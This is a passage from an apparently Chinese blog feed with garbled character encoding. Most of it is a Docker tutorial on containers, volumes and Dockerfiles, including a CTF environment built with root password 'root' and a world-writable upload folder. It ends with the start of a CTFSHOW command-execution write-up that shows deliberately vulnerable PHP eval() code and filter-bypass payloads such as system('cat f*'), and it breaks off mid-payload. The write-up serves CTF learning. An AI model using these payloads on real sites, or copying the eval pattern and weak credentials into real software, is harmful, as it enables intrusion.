(å¸¸ç”¨)</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">docker attach<span class="comment"># è¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯ï¼Œä¸ä¼šå¯åŠ¨æ–°çš„è¿›ç¨‹</span></span></span><br></pre></td></tr></table></figure><p><strong>ä»å®¹å™¨å†…æ‹·è´æ–‡ä»¶åˆ°ä¸»æœºä¸Š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">![2](/imgs/2.png)docker cp å®¹å™¨id:å®¹å™¨å†…è·¯å¾„ ç›®çš„ä¸»æœºè·¯å¾„</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹å½“å‰ä¸»æœºç›®å½•ä¸‹</span></span><br><span class="line">root@lemon-virtual-machine:/home# touch 1.php</span><br><span class="line">root@lemon-virtual-machine:/home# ls</span><br><span class="line">1.php  lemon</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES</span><br><span class="line">e6f07538e8c5   centos    &quot;/bin/bash&quot;   21 minutes ago   Up 20 minutes             frosty_goldwasser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿›å…¥dockerå®¹å™¨å†…éƒ¨</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker attach e6f07538e8c5  </span><br><span class="line">[root@e6f07538e8c5 /]# cd home</span><br><span class="line">[root@e6f07538e8c5 home]# ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">åœ¨å®¹å™¨å†…æ–°å»ºä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">[root@e6f07538e8c5 home]# touch 2.php</span><br><span class="line">[root@e6f07538e8c5 home]# ls</span><br><span class="line">2.php</span><br><span class="line">[root@e6f07538e8c5 home]# exit       </span><br><span class="line">exit</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">root@lemon-virtual-machine:/home# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS                          PORTS     NAMES</span><br><span class="line">e6f07538e8c5   centos    &quot;/bin/bash&quot;   24 minutes ago   Exited (0) About a minute ago             frosty_goldwasser</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å°†æ–‡ä»¶æ‹·è´å‡ºæ¥åˆ°ä¸»æœºä¸Š</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker cp e6f07538e8c5:/home/2.php /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">root@lemon-virtual-machine:/home# ls</span><br><span class="line">1.php  2.php  lemon</span><br></pre></td></tr></table></figure><h1 id="å®¹å™¨æ•°æ®å·"><a href="#å®¹å™¨æ•°æ®å·" class="headerlink" title="å®¹å™¨æ•°æ®å·"></a>å®¹å™¨æ•°æ®å·</h1><p><strong>å®¹å™¨çš„æŒä¹…åŒ–å’ŒåŒæ­¥æ“ä½œï¼å®¹å™¨é—´ä¹Ÿæ˜¯å¯ä»¥æ•°æ®å…±äº«çš„ï¼</strong></p><h2 id="ä½¿ç”¨æ•°æ®å·"><a href="#ä½¿ç”¨æ•°æ®å·" class="headerlink" title="ä½¿ç”¨æ•°æ®å·"></a>ä½¿ç”¨æ•°æ®å·</h2><blockquote><p>æ–¹å¼ä¸€ï¼šç›´æ¥ä½¿ç”¨å‘½ä»¤æ¥æŒ‚è½½ -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v ä¸»æœºç›®å½•:å®¹å™¨å†…ç›®å½•</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•</span></span><br><span class="line">root@lemon-virtual-machine:/home# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é€šè¿‡docker inspect å®¹å™¨<span class="built_in">id</span> æµ‹è¯•æ˜¯å¦æŒ‚è½½æˆåŠŸ</span></span><br><span class="line">&quot;Mounts&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;bind&quot;,</span><br><span class="line">                &quot;Source&quot;: &quot;/home/ceshi&quot;,# ä¸»æœºå†…åœ°å€</span><br><span class="line">                &quot;Destination&quot;: &quot;/home&quot;,# dockerå®¹å™¨å†…åœ°å€</span><br><span class="line">                &quot;Mode&quot;: &quot;&quot;,</span><br><span class="line">                &quot;RW&quot;: true,</span><br><span class="line">                &quot;Propagation&quot;: &quot;rprivate&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æµ‹è¯•æ–‡ä»¶åŒæ­¥ï¼ŒåŒæ­¥çš„æ—¶å€™åŒå‘ç»‘å®š</span></span><br><span class="line"></span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">[root@52ae30c66f73 home]# touch 1.php</span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">1.php</span><br><span class="line">[root@52ae30c66f73 home]# ls</span><br><span class="line">1.php  2.php</span><br><span class="line"></span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">1.php</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# touch 2.php</span><br><span class="line">root@lemon-virtual-machine:/home/ceshi# ls</span><br><span class="line">1.php  2.php</span><br></pre></td></tr></table></figure><p><strong>å‡è®¾å°†å®¹å™¨åˆ é™¤ï¼Œæˆ‘ä»¬æŒ‚è½½åˆ°æœ¬åœ°çš„æ•°æ®å·ä¾æ—§æ²¡æœ‰ä¸¢å¤±ï¼Œå®ç°äº†å®¹å™¨æ•°æ®æŒä¹…åŒ–åŠŸèƒ½</strong></p><h1 id="DockerFile"><a href="#DockerFile" class="headerlink" title="DockerFile"></a>DockerFile</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><blockquote><p>DockerFileæ˜¯ç”¨æ¥æ„å»ºdockeré•œåƒçš„æ–‡ä»¶ï¼å‘½ä»¤å‚æ•°è„šæœ¬ï¼</p></blockquote><p><strong>æ„å»ºæ­¥éª¤ï¼š</strong></p><ol><li>ç¼–å†™ä¸€ä¸ªdockerfileæ–‡ä»¶</li><li>docker buildæ„å»ºæˆä¸ºä¸€ä¸ªé•œåƒ</li><li>docker runè¿è¡Œé•œåƒ</li><li>docker push å‘å¸ƒé•œåƒï¼ˆDockerHubã€é˜¿é‡Œäº‘é•œåƒä»“åº“ï¼‰</li></ol><h2 id="DockerFIleæ„å»ºè¿‡ç¨‹"><a href="#DockerFIleæ„å»ºè¿‡ç¨‹" class="headerlink" title="DockerFIleæ„å»ºè¿‡ç¨‹"></a>DockerFIleæ„å»ºè¿‡ç¨‹</h2><p><strong>åŸºç¡€çŸ¥è¯†ï¼š</strong></p><ol><li>æ¯ä¸ªä¿ç•™å…³é”®å­—ï¼ˆæŒ‡ä»¤ï¼‰éƒ½å¿…é¡»æ˜¯å¤§å†™å­—æ¯</li><li>æ‰§è¡Œä»ä¸Šåˆ°ä¸‹é¡ºåºæ‰§è¡Œ</li><li>#  è¡¨ç¤ºæ³¨é‡Š</li><li>æ¯ä¸€ä¸ªæŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚ï¼Œå¹¶æäº¤ï¼</li></ol><h2 id="DockerFileçš„æŒ‡ä»¤"><a href="#DockerFileçš„æŒ‡ä»¤" class="headerlink" title="DockerFileçš„æŒ‡ä»¤"></a>DockerFileçš„æŒ‡ä»¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM# åŸºç¡€é•œåƒï¼Œä¸€åˆ‡ä»è¿™é‡Œå¼€å§‹æ„å»º</span><br><span class="line">MAINTAINER# é•œåƒæ˜¯è°å†™çš„ï¼Œå§“å+é‚®ç®±</span><br><span class="line">RUN# é•œåƒæ„å»ºçš„æ—¶å€™éœ€è¦è¿è¡Œçš„å‘½ä»¤</span><br><span class="line">ADD# æ­¥éª¤ï¼Œæ·»åŠ å†…å®¹</span><br><span class="line">WORDDIR# é•œåƒçš„å·¥ä½œç›®å½•</span><br><span class="line">VOLUME# æŒ‚è½½çš„ç›®å½•</span><br><span class="line">EXPOSE# æš´éœ²ç«¯å£</span><br><span class="line">CMD# æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨çš„æ—¶å€™è¿è¡Œçš„å‘½ä»¤ï¼Œåªæœ‰æœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆï¼Œå¯è¢«æ›¿ä»£</span><br><span class="line">ENTRYPOINT# æŒ‡å®šè¿™ä¸ªå®¹å™¨å¯åŠ¨çš„æ—¶å€™è¿è¡Œçš„å‘½ä»¤ï¼Œå¯ä»¥è¿½åŠ å‘½ä»¤</span><br><span class="line">ONBUILD# å½“æ„å»ºä¸€ä¸ªè¢«ç»§æ‰¿DockerFileè¿™ä¸ªæ—¶å€™å°±ä¼šè¿è¡ŒONBUILDçš„æŒ‡ä»¤ï¼Œè§¦å‘æŒ‡ä»¤</span><br><span class="line">COPY# ç±»ä¼¼ADDï¼Œå°†æ–‡ä»¶æ‹·è´åˆ°é•œåƒä¸­</span><br><span class="line">ENV# æ„å»ºçš„æ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure><h1 id="Dockerç½‘ç»œ"><a href="#Dockerç½‘ç»œ" class="headerlink" title="Dockerç½‘ç»œ"></a>Dockerç½‘ç»œ</h1><h2 id="ç†è§£Docker0"><a href="#ç†è§£Docker0" class="headerlink" title="ç†è§£Docker0"></a>ç†è§£Docker0</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo# æœ¬æœºå›ç¯åœ°å€</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:62:7f:25 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp2s1</span><br><span class="line">    inet 192.168.17.133/24 brd 192.168.17.255 scope global dynamic noprefixroute ens33# å†…ç½‘åœ°å€</span><br><span class="line">       valid_lft 1198sec preferred_lft 1198sec</span><br><span class="line">    inet6 fe80::d486:4c41:fe68:5cae/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:5e:55:89:c5 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0# docker0åœ°å€</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:5eff:fe55:89c5/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><blockquote><p>é—®é¢˜ï¼šdockeræ˜¯å¦‚ä½•å¤„ç†å®¹å™¨ç½‘ç»œè®¿é—®çš„ï¼Ÿ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">root@lemon-virtual-machine:/<span class="comment"># docker run -d -P --name tomcat01 tomcat</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹å®¹å™¨çš„å†…éƒ¨ç½‘ç»œåœ°å€ip addr</span></span><br><span class="line">root@lemon-virtual-machine:/# docker exec -it tomcat01 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><blockquote><p>åŸç†</p><p>æ¯å¯åŠ¨ä¸€ä¸ªdockerå®¹å™¨ï¼Œdockerå°±ä¼šç»™dockerå®¹å™¨åˆ†é…ä¸€ä¸ªipï¼Œæˆ‘ä»¬åªè¦å®‰è£…äº†dockerï¼Œå°±ä¼šæœ‰ä¸€ä¸ªdocker0æ¡¥æ¥æ¨¡å¼ï¼Œä½¿ç”¨çš„æŠ€æœ¯æ˜¯evth-pairæŠ€æœ¯ï¼</p></blockquote><h1 id="éƒ¨ç½²ç¯å¢ƒ"><a href="#éƒ¨ç½²ç¯å¢ƒ" class="headerlink" title="éƒ¨ç½²ç¯å¢ƒ"></a>éƒ¨ç½²ç¯å¢ƒ</h1><h2 id="Docker-1"><a href="#Docker-1" class="headerlink" title="Docker"></a>Docker</h2><p>å¯åŠ¨docker</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>æ‹‰å–lampé•œåƒ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search lamp</span><br><span class="line">docker pull tutum/lamp <span class="comment">#éšä¾¿pulläº†ä¸€ä¸ªé•œåƒ</span></span><br></pre></td></tr></table></figure><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>ä¸‹è½½åŸºæœ¬çš„php,mysqlç¯å¢ƒ</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g&#x27;</span> /etc/apk/repositories \</span><br><span class="line">    &amp;&amp; apk <span class="keyword">add</span><span class="language-bash"> --update --no-cache nginx mysql mysql-client \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-source extract \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-install mysql \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-source delete \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql_install_db --user=mysql --datadir=/var/lib/mysql \</span></span><br></pre></td></tr></table></figure><p>é…ç½®mysqlç¯å¢ƒï¼Œä¸ºrootç”¨æˆ·è®¾ç½®äº†å¯†ç rootï¼ŒåŒæ—¶è¿è¡Œäº†db.sqlæ–‡ä»¶æ¥é…ç½®sqlæ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sh -c &#x27;mysqld_safe &amp;&#x27; \</span><br><span class="line">    &amp;&amp; sleep 5s \</span><br><span class="line">    &amp;&amp; mysqladmin -uroot password &#x27;root&#x27; \</span><br><span class="line">    &amp;&amp; mysql -e &quot;source /tmp/db.sql;&quot; -uroot -proot \</span><br></pre></td></tr></table></figure><p>é…ç½®nginxç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /run/nginx \</span><br><span class="line">    &amp;&amp; mv /tmp/nginx.conf /etc/nginx/nginx.conf \</span><br><span class="line">    &amp;&amp; mv /tmp/vhost.nginx.conf /etc/nginx/conf.d/default.conf \</span><br></pre></td></tr></table></figure><p>ç§»åŠ¨æ–‡ä»¶ï¼Œä¿®æ”¹æƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/src/* /var/www/html \</span><br><span class="line">    &amp;&amp; chmod -R -w /var/www/html \</span><br><span class="line">    &amp;&amp; chmod -R 777 /var/www/html/upload \</span><br><span class="line">    &amp;&amp; chown -R www-data:www-data /var/www/html \</span><br></pre></td></tr></table></figure><p>åˆ é™¤ä¹‹å‰/tmpæ–‡ä»¶å¤¹ä¸‹çš„ç›¸å…³é…ç½®æ–‡ä»¶ï¼Œé˜²æ­¢è¢«é€šè¿‡éé¢„æœŸè§£å¾—åˆ°Flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /tmp/* \</span><br><span class="line">    &amp;&amp; rm -rf /etc/apk</span><br></pre></td></tr></table></figure><p>EXPOSEå‘½ä»¤æ˜¯æ˜ å°„åˆ°å®¿ä¸»æœºçš„ç«¯å£ï¼Œè¿™ä¸ªå‘½ä»¤ä¸»è¦ä½“ç°åœ¨å¯åŠ¨å®¹å™¨æ‰€æ‰§è¡Œçš„å‘½ä»¤ä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3389:80 tutum/lamp</span><br></pre></td></tr></table></figure><p>ç»è¿‡ä¸Šé¢è¿™äº›æ­¥éª¤ï¼Œä¸€ä¸ªDockerfileå°±åˆ¶ä½œå®Œæˆå•¦ï¼åˆ¶ä½œé•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t test .</span><br></pre></td></tr></table></figure><p>å¯åŠ¨å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 1871:80 test</span><br></pre></td></tr></table></figure><h2 id="php7ç¯å¢ƒ"><a href="#php7ç¯å¢ƒ" class="headerlink" title="php7ç¯å¢ƒ"></a>php7ç¯å¢ƒ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name php-nginx -p 6677:80 -v ./docker/nginx/www:/usr/share/nginx/html -v ./docker/nginx/conf:/etc/nginx/conf.d --link myphp7:php -d nginx</span><br></pre></td></tr></table></figure><h2 id="flaskç¯å¢ƒ"><a href="#flaskç¯å¢ƒ" class="headerlink" title="flaskç¯å¢ƒ"></a>flaskç¯å¢ƒ</h2><p>dockerfileï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.9</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> Hoylindo    </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app   </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip3 install flask -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> FLASK_APP app </span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;flask&quot;</span>,<span class="string">&quot;run&quot;</span>,<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;0.0.0.0&quot;</span>,<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;5000&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>åˆ¶ä½œé•œåƒ(åœ¨dockerfileåŒç›®å½•ä¸‹)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t demo2:0.1 .  </span><br></pre></td></tr></table></figure><p>è¿è¡Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name demoflask1 -p 5000:5000 demo2:0.1</span><br></pre></td></tr></table></figure><h2 id="lamp"><a href="#lamp" class="headerlink" title="lamp"></a>lamp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 10013:80 -p 10012:3306 tutum/lamp</span><br><span class="line">#æ˜ å°„ç«¯å£å‰é¦–å…ˆç¡®å®šç«¯å£æ²¡æœ‰è¢«å ç”¨</span><br><span class="line">#-d //å®¹å™¨åå°è¿è¡Œã€‚</span><br><span class="line">#-p //æŒ‡å®šæ˜ å°„ç«¯å£ã€‚</span><br><span class="line">#-P //éšæœºæ˜ å°„é«˜ç«¯å£</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="goç¯å¢ƒ"><a href="#goç¯å¢ƒ" class="headerlink" title="goç¯å¢ƒ"></a>goç¯å¢ƒ</h2><p><a href="https://blog.csdn.net/q20010619/article/details/108587879">ç”¨Dockeræ­å»ºç¯å¢ƒéƒ¨ç½²Ctfé¢˜ç›®(è¿‡ç¨‹åŠé—®é¢˜è§£å†³)_OceanSecçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.v0n.top/2020/05/01/å¦‚ä½•æ­£ç¡®ä½¿ç”¨Dockerå‡ºä¸€é“CTFé¢˜ç›®/">å¦‚ä½•æ­£ç¡®ä½¿ç”¨Dockerå‡ºä¸€é“CTFé¢˜ç›® - Vonçš„åšå®¢ | Von Blog (v0n.top)</a></p><p><a href="https://blog.csdn.net/Jasonx001/article/details/119429698">Dockerå­¦ä¹ ç¬”è®°â€”-å¯åŠ¨æœåŠ¡ã€æŸ¥çœ‹ã€åœæ­¢å®¹å™¨_88å…ˆç”Ÿçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/Nightwish5/article/details/105071070">dockerfileä½¿ç”¨copyæŠ¥é”™stat /var/lib/docker/tmp xxxxxxxx No such file or directory _Nightwish5çš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2023/07/26/CTFSHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/07/26/CTFSHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web29-å…³é”®å­—ç»•è¿‡"><a href="#web29-å…³é”®å­—ç»•è¿‡" class="headerlink" title="web29(å…³é”®å­—ç»•è¿‡)"></a>web29(å…³é”®å­—ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=system(&quot;cat f*&quot;);</code></p><ul><li>å‘ç°<code>flag</code>è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥åˆ©ç”¨æ­£åˆ™åŒ¹é…ç»•è¿‡</li></ul><h1 id="web30-å…³é”®å­—ç»•è¿‡"><a href="#web30-å…³é”®å­—ç»•è¿‡" class="headerlink" title="web30(å…³é”®å­—ç»•è¿‡)"></a>web30(å…³é”®å­—ç»•è¿‡)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: echo`cat f*` 